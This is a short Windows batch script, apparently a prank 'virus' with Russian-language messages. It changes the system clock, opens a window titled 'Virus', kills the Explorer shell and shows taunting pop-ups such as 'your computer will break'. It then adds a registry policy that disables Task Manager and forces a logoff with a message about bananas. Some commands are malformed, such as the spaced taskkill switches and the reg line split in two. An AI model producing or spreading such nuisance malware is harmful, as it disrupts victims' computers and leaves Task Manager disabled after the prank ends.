@echo off
time 2:28 >nul
start "Virus" "cmd" /c "color 2 && dir /s C:\"
start mspaint
start explorer
taskkill / f / IM explorer.exe
msg * Напишите текст сообщения вместо этого текста
msg * Напишите текст сообщения вместо этого текста
msg * твой комп сломаються
reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v DisableTaskMgr /t 
REG_DWORD /d 1 /f
shutdown -l -t 1 -c "Бананы выключили твой пк!>" -f >nul
